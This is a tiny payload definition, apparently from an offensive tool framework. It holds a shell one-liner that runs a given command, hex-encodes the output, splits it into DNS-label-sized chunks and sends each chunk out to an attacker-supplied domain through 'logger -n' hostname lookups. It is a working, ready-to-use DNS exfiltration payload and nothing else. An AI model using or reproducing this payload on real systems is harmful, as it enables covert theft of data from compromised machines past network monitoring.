USAGE = 'domain cmd [arg...]'
NARGS = [2, 0]
LANG = 'sh'
EXEC = 'PAYLOAD'

pl = '''
i=0;ARG2ARGN|od -vtx1 -An|(xargs -n63 printf %s;echo)|fold -w62|while read p;do logger -n $i.$p.ARG1 1&i=$(($i+1));done
'''
